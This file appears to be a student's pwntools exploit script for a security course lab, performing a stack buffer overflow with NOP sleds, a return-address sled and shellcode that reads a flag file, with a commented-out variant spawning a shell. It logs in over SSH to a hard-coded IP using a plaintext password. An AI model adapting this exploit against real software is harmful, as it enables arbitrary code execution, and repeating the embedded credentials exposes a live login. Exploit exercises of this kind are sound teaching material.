#!/usr/bin/env python2

from pwn import *

exe = "./target"
mydir = "jmp-to-stack"
path = "/home/lab03/" + mydir

context.terminal = ['tmux', 'splitw', '-v']
context.update(arch='i386', os='linux')

env = {"SHELLCODE": "\x90"*0x1000 + asm(pwnlib.shellcraft.i386.linux.cat("/proc/flag"))}
#env = {"SHELLCODE": asm(pwnlib.shellcraft.i386.linux.sh())}

padding = 0x63616171
nop_offset = 1000

# Address to use
# Got this address by forcing a segfault, using the telescope command to
# examine the stack, then examining the stack with x/20wx
local_addr_invoke = 0xffffcf74
local_addr_gdb = 0xffffc124
server_start_invoke = 0xffffd12c
server_start_gdb = 0xffffc998
start_addr = server_start_gdb
start_addr = start_addr + (nop_offset/2)

# NOP sled
nop_sled = "\x90" * nop_offset

shellcode = shellcraft.cat("/proc/flag")

# start constructing payload
payload  = cyclic(cyclic_find(padding))
payload += p32(start_addr)
payload += nop_sled
payload += asm(shellcode)
payload += nop_sled

# Address sled
for i in range (0, 200):
    payload += p32(start_addr)

f = open('shellcode', 'w')
f.write(payload)
f.close()

s = ssh("lab03", "52.201.10.159", password="b50e289f")
p = s.process(["./target", payload], cwd="/home/lab03/jmp-to-stack")

#p = process(["./target", payload], cwd="/home/jakeholl/git/cs6265/lab03/jmp-to-stack")

p.interactive()
